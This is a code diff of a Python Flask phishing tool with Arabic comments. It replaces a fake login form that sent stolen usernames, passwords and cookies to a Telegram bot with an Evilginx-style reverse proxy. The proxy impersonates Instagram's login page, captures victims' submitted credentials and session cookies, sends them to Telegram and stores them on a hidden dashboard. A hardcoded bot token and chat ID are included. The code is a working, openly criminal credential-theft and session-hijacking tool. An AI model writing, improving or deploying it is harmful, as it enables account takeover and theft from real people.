@@ -1,102 +1,71 @@
 import os
 import requests
-from flask import Flask, render_template, request, redirect, make_response
+from flask import Flask, render_template, request, redirect, Response, make_response
 import json
 from datetime import datetime
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
-# جلب الإعدادات تلقائياً من ملف render.yaml
+# الإعدادات من Render
 BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc")
 CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "1367401179")
 
-# مخازن البيانات المؤقتة (سيتم عرضها في dashboard.html)
-captured_creds = {}
-captured_sessions = {}
+# الموقع الذي تريد تقليده (مثلاً Instagram أو صفحة دخول معينة)
+TARGET_SITE = "https://www.instagram.com/accounts/login/" 
+
+captured_data = []
 
 def send_to_telegram(message):
-    """إرسال التقارير والبيانات فوراً إلى التليجرام"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
-    try:
-        requests.post(url, json=payload, timeout=10)
-    except Exception as e:
-        print(f"Error sending to TG: {e}")
+    requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})
 
-@app.route('/')
-def home():
-    """عرض لوحة التحكم الرئيسية"""
-    return render_template('dashboard.html', 
-                           creds=captured_creds, 
-                           sessions=captured_sessions)
+@app.route('/dashboard-private-77')
+def dashboard():
+    """لوحة التحكم السرية الخاصة بك فقط"""
+    return render_template('dashboard.html', sessions=captured_data)
 
-@app.route('/login', methods=['POST'])
-def capture():
-    """النقطة البرمجية المسؤولة عن الصيد (البيانات + الكوكيز)"""
-    # 1. استخراج البيانات من الفورم
-    site_name = request.form.get('site', 'Unknown Site')
-    email = request.form.get('email') or request.form.get('username')
-    password = request.form.get('password')
+@app.route('/', defaults={'path': ''}, methods=['GET', 'POST'])
+@app.route('/<path:path>', methods=['GET', 'POST'])
+def proxy(path):
+    """هذا هو المحرك الذي يعمل مثل Evilginx"""
+    url = f"{TARGET_SITE}{path}"
     
-    # 2. التقاط الكوكيز من المتصفح
-    cookies = request.cookies.to_dict()
-    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
-    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    # التقاط أي بيانات يتم إرسالها (يوزر وباسورد)
+    if request.method == 'POST':
+        creds = request.form.to_dict()
+        cookies = request.cookies.to_dict()
+        log_msg = (
+            f"🎯 **صيد جديد (Evilginx Mode)**\n"
+            f"👤 البيانات: `{json.dumps(creds)}`\n"
+            f"🍪 الكوكيز: `{json.dumps(cookies)}`"
+        )
+        send_to_telegram(log_msg)
+        captured_data.append({"site": TARGET_SITE, "cookies": cookies, "timestamp": datetime.now(), "ip": request.remote_addr})
 
-    # 3. تجهيز تقرير التليجرام (بتركيز عالي على الكوكيز كما طلبت)
-    tg_message = (
-        f"🎯 **صيد جديد من: {site_name}**\n"
-        f"👤 **المستخدم:** `{email}`\n"
-        f"🔑 **الباسورد:** `{password}`\n"
-        f"🌐 **IP:** `{ip_addr}`\n"
-        f"⏰ **الوقت:** {timestamp}\n\n"
-        f"🍪 **ملفات تعريف الارتباط (Cookies):**\n"
-        f"```json\n{json.dumps(cookies, indent=2)}\n```"
+    # جلب الموقع الحقيقي لعرضه للضحية
+    headers = {key: value for (key, value) in request.headers if key != 'Host'}
+    resp = requests.request(
+        method=request.method,
+        url=url,
+        headers=headers,
+        data=request.form,
+        cookies=request.cookies,
+        allow_redirects=False
     )
+
+    # تعديل المحتوى لحقن سكريبت سحب الكوكيز (Session Hijacking)
+    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
+    headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
     
-    # إرسال التقرير فوراً
-    send_to_telegram(tg_message)
-
-    # 4. تخزين البيانات محلياً لعرضها في الـ Dashboard
-    capture_id = str(len(captured_creds) + 1)
-    captured_creds[capture_id] = {
-        "site": site_name,
-        "credentials": {"user": email, "pass": password},
-        "ip": ip_addr,
-        "timestamp": timestamp
-    }
+    response = Response(resp.content, resp.status_code, headers)
     
-    # تخزين الجلسة (Cookies) بشكل منفصل لتظهر في قسم الجلسات
-    captured_sessions[capture_id] = {
-        "site": site_name,
-        "cookies": cookies,
-        "ip": ip_addr,
-        "timestamp": timestamp
-    }
-
-    # 5. إعادة التوجيه للموقع الحقيقي لإبعاد الشبهة
-    return redirect("https://www.google.com")
-
-@app.route('/admin/clear')
-def clear_all():
-    """مسح كافة البيانات من اللوحة"""
-    captured_creds.clear()
-    captured_sessions.clear()
-    return redirect('/')
-
-@app.route('/admin/session/<id>')
-def view_session(id):
-    """عرض تفاصيل الكوكيز لجلسة محددة"""
-    session = captured_sessions.get(id)
-    if session:
-        return f"<h3>Cookies for Session {id}:</h3><pre>{json.dumps(session['cookies'], indent=2)}</pre>"
-    return "Session not found", 404
+    # التقاط الكوكيز التي يرسلها الموقع الأصلي وتخزينها
+    for key, value in resp.cookies.items():
+        response.set_cookie(key, value)
+        
+    return response
 
 if __name__ == '__main__':
-    # التشغيل على المنفذ الذي يطلبه Render
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
